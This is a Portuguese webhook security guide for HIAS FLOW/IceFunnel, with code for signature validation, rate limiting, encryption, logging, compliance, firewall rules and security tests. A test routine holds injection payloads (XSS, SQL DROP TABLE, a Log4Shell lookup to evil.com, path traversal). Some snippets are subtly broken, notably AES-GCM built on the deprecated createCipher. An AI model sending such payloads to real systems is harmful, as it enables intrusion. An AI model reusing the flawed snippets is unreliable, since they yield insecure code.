# Guia de Segurança para Webhooks - HIAS FLOW

## Visão Geral de Segurança

A segurança dos webhooks é fundamental para proteger dados sensíveis e garantir a integridade das integrações. Este guia aborda todas as práticas de segurança implementadas no HIAS FLOW e como configurá-las corretamente.

---

## 1. Autenticação e Autorização

### Assinatura HMAC-SHA256

Todos os webhooks do IceFunnel são assinados usando HMAC-SHA256 para garantir autenticidade e integridade.

#### Como Funciona
1. **Payload** é serializado em JSON
2. **Secret** é usado como chave HMAC
3. **Assinatura** é calculada usando SHA256
4. **Header** `X-Webhook-Signature` contém a assinatura

#### Implementação de Validação

```javascript
// Node.js/Express
const crypto = require('crypto');

function validateWebhookSignature(payload, signature, secret) {
  // Calcular assinatura esperada
  const expectedSignature = crypto
    .createHmac('sha256', secret)
    .update(JSON.stringify(payload))
    .digest('hex');
  
  // Comparação segura para evitar timing attacks
  const expectedBuffer = Buffer.from(`sha256=${expectedSignature}`, 'utf8');
  const receivedBuffer = Buffer.from(signature, 'utf8');
  
  return expectedBuffer.length === receivedBuffer.length &&
         crypto.timingSafeEqual(expectedBuffer, receivedBuffer);
}

// Middleware de validação
const validateWebhook = (req, res, next) => {
  const signature = req.headers['x-webhook-signature'];
  const secret = process.env.ICEFUNNEL_WEBHOOK_SECRET;
  
  if (!signature) {
    return res.status(401).json({ error: 'Missing signature' });
  }
  
  if (!validateWebhookSignature(req.body, signature, secret)) {
    return res.status(401).json({ error: 'Invalid signature' });
  }
  
  next();
};

app.use('/webhook/icefunnel', validateWebhook);
```

```python
# Python/Flask
import hmac
import hashlib
import json
from flask import request, abort

def validate_webhook_signature(payload, signature, secret):
    expected_signature = hmac.new(
        secret.encode('utf-8'),
        json.dumps(payload, separators=(',', ':')).encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    expected = f"sha256={expected_signature}"
    return hmac.compare_digest(expected, signature)

@app.route('/webhook/icefunnel', methods=['POST'])
def handle_webhook():
    signature = request.headers.get('X-Webhook-Signature')
    secret = os.environ.get('ICEFUNNEL_WEBHOOK_SECRET')
    
    if not signature or not validate_webhook_signature(request.json, signature, secret):
        abort(401)
    
    # Processar webhook...
    return {'received': True}
```

```php
// PHP
function validateWebhookSignature($payload, $signature, $secret) {
    $expectedSignature = 'sha256=' . hash_hmac('sha256', json_encode($payload), $secret);
    return hash_equals($expectedSignature, $signature);
}

// Uso
$signature = $_SERVER['HTTP_X_WEBHOOK_SIGNATURE'] ?? '';
$secret = $_ENV['ICEFUNNEL_WEBHOOK_SECRET'];
$payload = json_decode(file_get_contents('php://input'), true);

if (!validateWebhookSignature($payload, $signature, $secret)) {
    http_response_code(401);
    exit('Invalid signature');
}

// Processar webhook...
```

### Rotação de Secrets

```javascript
// Rotação automática de secrets
class SecretRotation {
  constructor() {
    this.rotationInterval = 30 * 24 * 60 * 60 * 1000; // 30 dias
  }

  async rotateWebhookSecret(webhookId) {
    // Gerar novo secret
    const newSecret = crypto.randomBytes(32).toString('hex');
    
    // Período de transição (aceitar ambos os secrets)
    await this.setTransitionPeriod(webhookId, newSecret);
    
    // Notificar sobre mudança
    await this.notifySecretRotation(webhookId, newSecret);
    
    // Após período de graça, usar apenas novo secret
    setTimeout(async () => {
      await this.finalizeSecretRotation(webhookId, newSecret);
    }, 7 * 24 * 60 * 60 * 1000); // 7 dias de transição
  }

  async validateWithBothSecrets(payload, signature, oldSecret, newSecret) {
    return validateWebhookSignature(payload, signature, oldSecret) ||
           validateWebhookSignature(payload, signature, newSecret);
  }
}
```

---

## 2. Validação de Origem

### Whitelist de IPs

```javascript
// IP whitelist para webhooks
const ICEFUNNEL_IPS = [
  '52.89.214.238',
  '52.89.214.239',
  '54.187.174.169',
  '54.187.205.235',
  // IPs adicionais conforme necessário
];

const validateSourceIP = (req, res, next) => {
  const clientIP = req.ip || 
                   req.connection.remoteAddress || 
                   req.headers['x-forwarded-for']?.split(',')[0];
  
  if (!ICEFUNNEL_IPS.includes(clientIP)) {
    console.warn(`Webhook request from unauthorized IP: ${clientIP}`);
    return res.status(403).json({ error: 'Unauthorized IP address' });
  }
  
  next();
};

app.use('/webhook/icefunnel', validateSourceIP);
```

### Validação de User-Agent

```javascript
const validateUserAgent = (req, res, next) => {
  const userAgent = req.headers['user-agent'];
  
  if (!userAgent || !userAgent.startsWith('IceFunnel-Webhooks/')) {
    console.warn(`Invalid User-Agent: ${userAgent}`);
    return res.status(403).json({ error: 'Invalid User-Agent' });
  }
  
  next();
};
```

---

## 3. Rate Limiting e DDoS Protection

### Rate Limiting Avançado

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

const redis = new Redis(process.env.REDIS_URL);

// Rate limiting por webhook ID
const webhookLimiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args) => redis.call(...args),
  }),
  windowMs: 60 * 1000, // 1 minuto
  max: (req) => {
    // Diferentes limites baseados no plano
    const webhookId = req.headers['x-webhook-id'];
    const plan = getUserPlan(webhookId);
    
    switch (plan) {
      case 'enterprise': return 1000;
      case 'pro': return 500;
      case 'starter': return 100;
      default: return 50;
    }
  },
  message: {
    error: 'Rate limit exceeded',
    retryAfter: '{{retryAfter}}'
  },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    return req.headers['x-webhook-id'] || req.ip;
  },
  skip: (req) => {
    // Pular rate limiting para IPs internos
    return ICEFUNNEL_IPS.includes(req.ip);
  }
});

app.use('/webhook', webhookLimiter);
```

### Proteção contra DDoS

```javascript
// DDoS protection middleware
const ddosProtection = (req, res, next) => {
  const now = Date.now();
  const windowSize = 60000; // 1 minuto
  const maxRequests = 1000;
  
  // Usar Redis para tracking distribuído
  const key = `ddos:${req.ip}`;
  
  redis.multi()
    .incr(key)
    .expire(key, 60)
    .exec((err, results) => {
      if (err) {
        console.error('Redis error:', err);
        return next();
      }
      
      const requestCount = results[0][1];
      
      if (requestCount > maxRequests) {
        console.warn(`DDoS attempt detected from ${req.ip}: ${requestCount} requests`);
        return res.status(429).json({
          error: 'Too many requests',
          retryAfter: 60
        });
      }
      
      next();
    });
};
```

---

## 4. Criptografia de Dados

### Criptografia de Payload Sensível

```javascript
const crypto = require('crypto');

class PayloadEncryption {
  constructor(encryptionKey) {
    this.algorithm = 'aes-256-gcm';
    this.key = Buffer.from(encryptionKey, 'hex');
  }

  encryptSensitiveData(payload) {
    const sensitiveFields = ['email', 'phone', 'ssn', 'credit_card'];
    const encrypted = { ...payload };
    
    for (const field of sensitiveFields) {
      if (encrypted.data && encrypted.data[field]) {
        encrypted.data[field] = this.encrypt(encrypted.data[field]);
      }
    }
    
    return encrypted;
  }

  encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(this.algorithm, this.key, iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex')
    };
  }

  decrypt(encryptedData) {
    const decipher = crypto.createDecipher(
      this.algorithm,
      this.key,
      Buffer.from(encryptedData.iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// Uso
const encryption = new PayloadEncryption(process.env.ENCRYPTION_KEY);

app.post('/webhook/icefunnel', (req, res) => {
  // Descriptografar dados sensíveis se necessário
  const payload = req.body;
  
  if (payload.encrypted) {
    payload.data = encryption.decryptSensitiveData(payload.data);
  }
  
  // Processar payload...
  res.json({ received: true });
});
```

---

## 5. Auditoria e Logging

### Sistema de Auditoria Completo

```javascript
// audit-system.js
class WebhookAuditSystem {
  constructor() {
    this.auditLogger = new AuditLogger();
  }

  async logWebhookEvent(webhookId, event, data, result) {
    const auditEntry = {
      timestamp: new Date().toISOString(),
      webhookId,
      event,
      // Hash dos dados para privacidade
      dataHash: crypto.createHash('sha256')
        .update(JSON.stringify(data))
        .digest('hex'),
      success: result.success,
      httpStatus: result.httpStatus,
      duration: result.duration,
      attempts: result.attempts,
      userAgent: result.userAgent,
      sourceIP: result.sourceIP,
      // Metadados de segurança
      security: {
        signatureValid: result.signatureValid,
        ipWhitelisted: result.ipWhitelisted,
        rateLimitHit: result.rateLimitHit
      }
    };

    await this.auditLogger.log(auditEntry);
  }

  async getAuditTrail(webhookId, startDate, endDate) {
    return await this.auditLogger.query({
      webhookId,
      startDate,
      endDate,
      includeSecurityEvents: true
    });
  }

  async detectAnomalies() {
    const recentEvents = await this.auditLogger.getRecentEvents(24); // 24 horas
    
    const anomalies = [];
    
    // Detectar picos de erro
    const errorRate = this.calculateErrorRate(recentEvents);
    if (errorRate > 0.1) { // 10%
      anomalies.push({
        type: 'high_error_rate',
        severity: 'high',
        value: errorRate,
        threshold: 0.1
      });
    }
    
    // Detectar tentativas de acesso não autorizado
    const unauthorizedAttempts = recentEvents.filter(e => 
      !e.security.signatureValid || !e.security.ipWhitelisted
    );
    
    if (unauthorizedAttempts.length > 10) {
      anomalies.push({
        type: 'unauthorized_access_attempts',
        severity: 'critical',
        count: unauthorizedAttempts.length,
        ips: [...new Set(unauthorizedAttempts.map(a => a.sourceIP))]
      });
    }
    
    return anomalies;
  }
}
```

### Logs Estruturados

```javascript
// structured-logging.js
const winston = require('winston');

const webhookLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: { service: 'webhook-service' },
  transports: [
    new winston.transports.File({ 
      filename: 'logs/webhook-error.log', 
      level: 'error' 
    }),
    new winston.transports.File({ 
      filename: 'logs/webhook-combined.log' 
    }),
    new winston.transports.Console({
      format: winston.format.simple()
    })
  ]
});

// Uso
app.post('/webhook/icefunnel', (req, res) => {
  const startTime = Date.now();
  const webhookId = req.headers['x-webhook-id'];
  const sourceIP = req.ip;
  
  webhookLogger.info('Webhook received', {
    webhookId,
    event: req.body.event,
    sourceIP,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString()
  });
  
  try {
    // Processar webhook...
    const duration = Date.now() - startTime;
    
    webhookLogger.info('Webhook processed successfully', {
      webhookId,
      duration,
      success: true
    });
    
    res.json({ received: true });
  } catch (error) {
    const duration = Date.now() - startTime;
    
    webhookLogger.error('Webhook processing failed', {
      webhookId,
      duration,
      error: error.message,
      stack: error.stack
    });
    
    res.status(500).json({ error: 'Processing failed' });
  }
});
```

---

## 6. Proteção de Dados Sensíveis

### Sanitização de Logs

```javascript
// data-sanitization.js
class DataSanitizer {
  constructor() {
    this.sensitiveFields = [
      'password', 'token', 'secret', 'key', 'ssn', 'cpf',
      'credit_card', 'card_number', 'cvv', 'pin'
    ];
    
    this.emailPattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
    this.phonePattern = /(\+?\d{1,3}[-.\s]?)?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}/g;
  }

  sanitizeForLogging(data) {
    const sanitized = JSON.parse(JSON.stringify(data));
    
    return this.recursiveSanitize(sanitized);
  }

  recursiveSanitize(obj) {
    if (typeof obj !== 'object' || obj === null) {
      return this.sanitizeString(obj);
    }

    if (Array.isArray(obj)) {
      return obj.map(item => this.recursiveSanitize(item));
    }

    const sanitized = {};
    for (const [key, value] of Object.entries(obj)) {
      if (this.isSensitiveField(key)) {
        sanitized[key] = '[REDACTED]';
      } else {
        sanitized[key] = this.recursiveSanitize(value);
      }
    }

    return sanitized;
  }

  sanitizeString(str) {
    if (typeof str !== 'string') return str;
    
    return str
      .replace(this.emailPattern, '[EMAIL_REDACTED]')
      .replace(this.phonePattern, '[PHONE_REDACTED]');
  }

  isSensitiveField(fieldName) {
    const lowerField = fieldName.toLowerCase();
    return this.sensitiveFields.some(sensitive => 
      lowerField.includes(sensitive)
    );
  }
}

// Uso
const sanitizer = new DataSanitizer();

webhookLogger.info('Webhook data', {
  webhookId: 'wh_123',
  sanitizedData: sanitizer.sanitizeForLogging(req.body)
});
```

### Mascaramento de Dados

```javascript
// data-masking.js
class DataMasking {
  static maskEmail(email) {
    if (!email || !email.includes('@')) return email;
    
    const [local, domain] = email.split('@');
    const maskedLocal = local.length > 2 
      ? local[0] + '*'.repeat(local.length - 2) + local[local.length - 1]
      : local[0] + '*';
    
    return `${maskedLocal}@${domain}`;
  }

  static maskPhone(phone) {
    if (!phone) return phone;
    
    const cleaned = phone.replace(/\D/g, '');
    if (cleaned.length < 4) return phone;
    
    const masked = '*'.repeat(cleaned.length - 4) + cleaned.slice(-4);
    return phone.replace(/\d/g, (match, index) => {
      const cleanIndex = phone.substring(0, index + 1).replace(/\D/g, '').length - 1;
      return cleanIndex < cleaned.length - 4 ? '*' : match;
    });
  }

  static maskCreditCard(cardNumber) {
    if (!cardNumber) return cardNumber;
    
    const cleaned = cardNumber.replace(/\D/g, '');
    return '*'.repeat(cleaned.length - 4) + cleaned.slice(-4);
  }
}
```

---

## 7. Compliance e Regulamentações

### LGPD/GDPR Compliance

```javascript
// gdpr-compliance.js
class GDPRCompliance {
  constructor() {
    this.dataRetentionPeriods = {
      'webhook_logs': 90, // dias
      'audit_logs': 365,
      'error_logs': 30,
      'personal_data': 1095 // 3 anos
    };
  }

  async handleDataSubjectRequest(type, email) {
    switch (type) {
      case 'access':
        return await this.exportPersonalData(email);
      case 'rectification':
        return await this.updatePersonalData(email);
      case 'erasure':
        return await this.deletePersonalData(email);
      case 'portability':
        return await this.exportDataForPortability(email);
    }
  }

  async exportPersonalData(email) {
    const data = {
      webhookLogs: await this.getWebhookLogsByEmail(email),
      formSubmissions: await this.getFormSubmissionsByEmail(email),
      conversions: await this.getConversionsByEmail(email),
      leadData: await this.getLeadDataByEmail(email)
    };

    // Sanitizar dados sensíveis de terceiros
    return this.sanitizeExportData(data);
  }

  async deletePersonalData(email) {
    const deletionTasks = [
      this.anonymizeWebhookLogs(email),
      this.deleteFormSubmissions(email),
      this.anonymizeConversions(email),
      this.deleteLeadData(email)
    ];

    await Promise.all(deletionTasks);
    
    // Log da deleção para auditoria
    await this.logDataDeletion(email);
  }

  async scheduleDataRetention() {
    // Executar limpeza automática baseada nos períodos de retenção
    for (const [dataType, retentionDays] of Object.entries(this.dataRetentionPeriods)) {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - retentionDays);
      
      await this.cleanupOldData(dataType, cutoffDate);
    }
  }
}
```

### Consentimento e Opt-out

```javascript
// consent-management.js
class ConsentManagement {
  async recordConsent(email, consentType, granted) {
    const consentRecord = {
      email,
      consentType, // 'marketing', 'analytics', 'webhooks'
      granted,
      timestamp: new Date().toISOString(),
      source: 'webhook_api',
      ipAddress: req.ip,
      userAgent: req.headers['user-agent']
    };

    await this.saveConsentRecord(consentRecord);
    
    // Atualizar configurações de webhook baseado no consentimento
    if (consentType === 'webhooks' && !granted) {
      await this.disableWebhooksForUser(email);
    }
  }

  async checkConsent(email, consentType) {
    const latestConsent = await this.getLatestConsent(email, consentType);
    return latestConsent?.granted || false;
  }

  async handleOptOut(email, optOutType) {
    // Registrar opt-out
    await this.recordConsent(email, optOutType, false);
    
    // Executar ações baseadas no tipo de opt-out
    switch (optOutType) {
      case 'all_communications':
        await this.disableAllWebhooks(email);
        await this.addToSuppressionList(email);
        break;
      case 'marketing':
        await this.disableMarketingWebhooks(email);
        break;
      case 'analytics':
        await this.anonymizeAnalyticsData(email);
        break;
    }
  }
}
```

---

## 8. Monitoramento de Segurança

### Detecção de Anomalias

```javascript
// security-monitoring.js
class SecurityMonitoring {
  constructor() {
    this.anomalyDetector = new AnomalyDetector();
    this.alertSystem = new AlertSystem();
  }

  async monitorWebhookSecurity() {
    const metrics = await this.collectSecurityMetrics();
    const anomalies = await this.anomalyDetector.detect(metrics);
    
    for (const anomaly of anomalies) {
      await this.handleSecurityAnomaly(anomaly);
    }
  }

  async collectSecurityMetrics() {
    const timeframe = 60 * 60 * 1000; // 1 hora
    const now = Date.now();
    const startTime = now - timeframe;

    return {
      failedSignatureValidations: await this.countFailedValidations(startTime, now),
      unauthorizedIPs: await this.getUnauthorizedIPs(startTime, now),
      rateLimitHits: await this.getRateLimitHits(startTime, now),
      suspiciousPatterns: await this.detectSuspiciousPatterns(startTime, now),
      errorSpikes: await this.detectErrorSpikes(startTime, now)
    };
  }

  async handleSecurityAnomaly(anomaly) {
    const severity = this.calculateSeverity(anomaly);
    
    // Log da anomalia
    securityLogger.warn('Security anomaly detected', {
      type: anomaly.type,
      severity,
      details: anomaly.details,
      timestamp: new Date().toISOString()
    });

    // Ações automáticas baseadas na severidade
    switch (severity) {
      case 'critical':
        await this.blockSuspiciousIPs(anomaly.details.ips);
        await this.alertSystem.sendCriticalAlert(anomaly);
        break;
      case 'high':
        await this.increaseSecurity(anomaly.details);
        await this.alertSystem.sendHighPriorityAlert(anomaly);
        break;
      case 'medium':
        await this.alertSystem.sendMediumPriorityAlert(anomaly);
        break;
    }
  }

  async blockSuspiciousIPs(ips) {
    for (const ip of ips) {
      await redis.setex(`blocked_ip:${ip}`, 3600, 'security_anomaly'); // 1 hora
      
      securityLogger.warn('IP blocked due to suspicious activity', {
        ip,
        duration: '1 hour',
        reason: 'security_anomaly'
      });
    }
  }
}
```

### Alertas de Segurança

```javascript
// security-alerts.js
class SecurityAlertSystem {
  constructor() {
    this.alertChannels = {
      email: new EmailAlerts(),
      slack: new SlackAlerts(),
      sms: new SMSAlerts(),
      webhook: new WebhookAlerts()
    };
  }

  async sendCriticalAlert(anomaly) {
    const alert = {
      level: 'CRITICAL',
      title: '🚨 ALERTA DE SEGURANÇA CRÍTICO',
      message: this.formatSecurityMessage(anomaly),
      timestamp: new Date().toISOString(),
      actions: this.getRecommendedActions(anomaly)
    };

    // Enviar para todos os canais
    await Promise.all([
      this.alertChannels.email.send(alert),
      this.alertChannels.slack.send(alert),
      this.alertChannels.sms.send(alert),
      this.alertChannels.webhook.send(alert)
    ]);
  }

  formatSecurityMessage(anomaly) {
    switch (anomaly.type) {
      case 'unauthorized_access_attempts':
        return `Detectadas ${anomaly.details.count} tentativas de acesso não autorizado de ${anomaly.details.ips.length} IPs diferentes nos últimos 60 minutos.`;
      
      case 'signature_validation_failures':
        return `${anomaly.details.count} falhas de validação de assinatura detectadas. Possível tentativa de falsificação de webhooks.`;
      
      case 'ddos_attack':
        return `Possível ataque DDoS detectado: ${anomaly.details.requestsPerSecond} req/s de ${anomaly.details.sourceIP}.`;
      
      default:
        return `Anomalia de segurança detectada: ${anomaly.type}`;
    }
  }

  getRecommendedActions(anomaly) {
    const actions = {
      'unauthorized_access_attempts': [
        'Verificar logs de acesso',
        'Considerar bloquear IPs suspeitos',
        'Revisar configurações de whitelist',
        'Verificar se secrets foram comprometidos'
      ],
      'signature_validation_failures': [
        'Verificar se secrets estão corretos',
        'Considerar rotação de secrets',
        'Investigar origem das requisições inválidas'
      ],
      'ddos_attack': [
        'Ativar proteção DDoS',
        'Bloquear IP atacante',
        'Notificar provedor de infraestrutura'
      ]
    };

    return actions[anomaly.type] || ['Investigar anomalia'];
  }
}
```

---

## 9. Backup e Recuperação

### Backup de Configurações

```javascript
// backup-system.js
class WebhookBackupSystem {
  async createBackup(userId) {
    const backupData = {
      timestamp: new Date().toISOString(),
      version: '1.0',
      userId,
      webhooks: await this.exportWebhookConfigs(userId),
      settings: await this.exportUserSettings(userId),
      secrets: await this.exportSecretsMetadata(userId) // Apenas metadados, não os secrets
    };

    // Criptografar backup
    const encrypted = await this.encryptBackup(backupData);
    
    // Salvar em múltiplas localizações
    await Promise.all([
      this.saveToS3(encrypted, `backups/${userId}/${Date.now()}.backup`),
      this.saveToLocalStorage(encrypted, userId),
      this.saveToSecondaryRegion(encrypted, userId)
    ]);

    return {
      backupId: `backup_${Date.now()}`,
      timestamp: backupData.timestamp,
      size: Buffer.byteLength(JSON.stringify(encrypted))
    };
  }

  async restoreFromBackup(backupId, userId) {
    // Recuperar backup
    const encrypted = await this.getBackupFromS3(backupId);
    const backupData = await this.decryptBackup(encrypted);
    
    // Validar integridade
    if (!this.validateBackupIntegrity(backupData)) {
      throw new Error('Backup integrity check failed');
    }

    // Restaurar configurações
    await this.restoreWebhookConfigs(backupData.webhooks, userId);
    await this.restoreUserSettings(backupData.settings, userId);
    
    // Log da restauração
    await this.logBackupRestore(backupId, userId);
  }

  async scheduleAutomaticBackups() {
    // Backup diário às 2:00 AM
    cron.schedule('0 2 * * *', async () => {
      const users = await this.getAllActiveUsers();
      
      for (const user of users) {
        try {
          await this.createBackup(user.id);
        } catch (error) {
          console.error(`Backup failed for user ${user.id}:`, error);
        }
      }
    });
  }
}
```

---

## 10. Testes de Segurança

### Testes de Penetração

```javascript
// security-testing.js
class WebhookSecurityTesting {
  async runSecurityTests(webhookUrl, secret) {
    const tests = [
      this.testSignatureValidation,
      this.testRateLimiting,
      this.testIPWhitelist,
      this.testPayloadInjection,
      this.testReplayAttacks
    ];

    const results = [];
    
    for (const test of tests) {
      try {
        const result = await test.call(this, webhookUrl, secret);
        results.push({
          test: test.name,
          passed: result.passed,
          details: result.details
        });
      } catch (error) {
        results.push({
          test: test.name,
          passed: false,
          error: error.message
        });
      }
    }

    return {
      timestamp: new Date().toISOString(),
      overallScore: this.calculateSecurityScore(results),
      results
    };
  }

  async testSignatureValidation(webhookUrl, secret) {
    // Teste 1: Assinatura válida
    const validPayload = { test: 'valid' };
    const validSignature = this.generateSignature(validPayload, secret);
    
    const validResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': validSignature
      },
      body: JSON.stringify(validPayload)
    });

    // Teste 2: Assinatura inválida
    const invalidResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': 'sha256=invalid'
      },
      body: JSON.stringify(validPayload)
    });

    return {
      passed: validResponse.ok && !invalidResponse.ok,
      details: {
        validSignatureAccepted: validResponse.ok,
        invalidSignatureRejected: !invalidResponse.ok
      }
    };
  }

  async testRateLimiting(webhookUrl, secret) {
    const requests = [];
    const payload = { test: 'rate_limit' };
    const signature = this.generateSignature(payload, secret);

    // Enviar muitas requisições rapidamente
    for (let i = 0; i < 200; i++) {
      requests.push(
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Webhook-Signature': signature
          },
          body: JSON.stringify(payload)
        })
      );
    }

    const responses = await Promise.allSettled(requests);
    const rateLimitedCount = responses.filter(r => 
      r.status === 'fulfilled' && r.value.status === 429
    ).length;

    return {
      passed: rateLimitedCount > 0,
      details: {
        totalRequests: requests.length,
        rateLimitedRequests: rateLimitedCount,
        rateLimitingActive: rateLimitedCount > 0
      }
    };
  }

  async testPayloadInjection(webhookUrl, secret) {
    const maliciousPayloads = [
      { test: '<script>alert("xss")</script>' },
      { test: '"; DROP TABLE webhooks; --' },
      { test: '${jndi:ldap://evil.com/a}' },
      { test: '../../../etc/passwd' }
    ];

    const results = [];
    
    for (const payload of maliciousPayloads) {
      const signature = this.generateSignature(payload, secret);
      
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Webhook-Signature': signature
        },
        body: JSON.stringify(payload)
      });

      results.push({
        payload: payload.test,
        status: response.status,
        handled: response.status === 400 || response.status === 422
      });
    }

    return {
      passed: results.every(r => r.handled),
      details: results
    };
  }
}
```

---

## 11. Configuração de Firewall

### Regras de Firewall

```bash
#!/bin/bash
# firewall-rules.sh

# Permitir apenas IPs do IceFunnel
ICEFUNNEL_IPS=(
  "52.89.214.238"
  "52.89.214.239"
  "54.187.174.169"
  "54.187.205.235"
)

# Limpar regras existentes
iptables -F INPUT
iptables -F OUTPUT

# Política padrão: negar tudo
iptables -P INPUT DROP
iptables -P OUTPUT DROP

# Permitir loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Permitir conexões estabelecidas
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Permitir IPs do IceFunnel na porta 443 (HTTPS)
for ip in "${ICEFUNNEL_IPS[@]}"; do
  iptables -A INPUT -s $ip -p tcp --dport 443 -j ACCEPT
done

# Permitir SSH apenas de IPs específicos
iptables -A INPUT -s YOUR_ADMIN_IP -p tcp --dport 22 -j ACCEPT

# Log de tentativas bloqueadas
iptables -A INPUT -j LOG --log-prefix "BLOCKED: "
iptables -A INPUT -j DROP

# Salvar regras
iptables-save > /etc/iptables/rules.v4
```

### Configuração Nginx

```nginx
# nginx-webhook-security.conf

# Rate limiting
limit_req_zone $binary_remote_addr zone=webhook:10m rate=10r/s;
limit_req_zone $http_x_webhook_id zone=webhook_id:10m rate=100r/s;

# Geo blocking (opcional)
geo $blocked_country {
    default 0;
    # Bloquear países específicos se necessário
    # CN 1; # China
    # RU 1; # Rússia
}

server {
    listen 443 ssl http2;
    server_name webhook.seudominio.com;

    # SSL Configuration
    ssl_certificate /path/to/certificate.crt;
    ssl_certificate_key /path/to/private.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    ssl_prefer_server_ciphers off;

    # Security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header X-XSS-Protection "1; mode=block";
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";

    # Webhook endpoint
    location /webhook/icefunnel {
        # Rate limiting
        limit_req zone=webhook burst=20 nodelay;
        limit_req zone=webhook_id burst=200 nodelay;

        # IP whitelist
        allow 52.89.214.238;
        allow 52.89.214.239;
        allow 54.187.174.169;
        allow 54.187.205.235;
        deny all;

        # Geo blocking
        if ($blocked_country) {
            return 403;
        }

        # Proxy para aplicação
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeout settings
        proxy_connect_timeout 5s;
        proxy_send_timeout 10s;
        proxy_read_timeout 10s;
    }

    # Log de segurança
    access_log /var/log/nginx/webhook_access.log combined;
    error_log /var/log/nginx/webhook_error.log warn;
}
```

---

## 12. Checklist de Segurança

### ✅ Checklist de Implementação

#### Autenticação
- [ ] Validação de assinatura HMAC-SHA256 implementada
- [ ] Secrets armazenados de forma segura (variáveis de ambiente)
- [ ] Rotação de secrets configurada (30 dias)
- [ ] Validação de timestamp para evitar replay attacks

#### Autorização
- [ ] Whitelist de IPs configurada
- [ ] Validação de User-Agent implementada
- [ ] Rate limiting por webhook ID
- [ ] Bloqueio automático de IPs suspeitos

#### Dados
- [ ] Sanitização de logs implementada
- [ ] Mascaramento de dados sensíveis
- [ ] Criptografia de dados em trânsito (HTTPS)
- [ ] Criptografia de dados em repouso

#### Monitoramento
- [ ] Logs estruturados configurados
- [ ] Sistema de alertas implementado
- [ ] Detecção de anomalias ativa
- [ ] Dashboard de segurança configurado

#### Compliance
- [ ] Políticas de retenção de dados definidas
- [ ] Processo de opt-out implementado
- [ ] Auditoria de acesso configurada
- [ ] Documentação de privacidade atualizada

#### Infraestrutura
- [ ] Firewall configurado
- [ ] SSL/TLS atualizado
- [ ] Backup automático ativo
- [ ] Plano de recuperação de desastres

### 🔍 Checklist de Auditoria Mensal

#### Revisão de Acessos
- [ ] Revisar logs de webhook dos últimos 30 dias
- [ ] Verificar tentativas de acesso não autorizado
- [ ] Analisar padrões de tráfego anômalos
- [ ] Revisar configurações de rate limiting

#### Atualização de Segurança
- [ ] Verificar atualizações de dependências
- [ ] Revisar configurações de firewall
- [ ] Testar processo de backup e restore
- [ ] Verificar validade de certificados SSL

#### Compliance
- [ ] Revisar políticas de retenção de dados
- [ ] Verificar solicitações de LGPD/GDPR
- [ ] Atualizar documentação de segurança
- [ ] Treinar equipe sobre novas ameaças

---

## 13. Resposta a Incidentes

### Plano de Resposta

```javascript
// incident-response.js
class IncidentResponse {
  async handleSecurityIncident(incident) {
    const severity = this.assessSeverity(incident);
    
    // Fase 1: Contenção
    await this.containThreat(incident, severity);
    
    // Fase 2: Investigação
    const investigation = await this.investigate(incident);
    
    // Fase 3: Erradicação
    await this.eradicateThreat(incident, investigation);
    
    // Fase 4: Recuperação
    await this.recover(incident);
    
    // Fase 5: Lições Aprendidas
    await this.documentLessonsLearned(incident, investigation);
  }

  async containThreat(incident, severity) {
    switch (severity) {
      case 'critical':
        // Bloquear todos os webhooks temporariamente
        await this.disableAllWebhooks();
        // Notificar equipe de segurança
        await this.notifySecurityTeam(incident);
        break;
        
      case 'high':
        // Bloquear webhooks afetados
        await this.disableAffectedWebhooks(incident.webhookIds);
        // Bloquear IPs suspeitos
        await this.blockSuspiciousIPs(incident.sourceIPs);
        break;
        
      case 'medium':
        // Aumentar monitoramento
        await this.increaseMonitoring(incident.webhookIds);
        break;
    }
  }

  async investigate(incident) {
    const investigation = {
      startTime: new Date().toISOString(),
      incidentId: incident.id,
      findings: []
    };

    // Coletar evidências
    investigation.logs = await this.collectRelevantLogs(incident);
    investigation.networkTraffic = await this.analyzeNetworkTraffic(incident);
    investigation.affectedSystems = await this.identifyAffectedSystems(incident);
    
    // Análise de causa raiz
    investigation.rootCause = await this.performRootCauseAnalysis(investigation);
    
    return investigation;
  }
}
```

### Comunicação de Incidentes

```javascript
// incident-communication.js
class IncidentCommunication {
  async notifyStakeholders(incident, phase) {
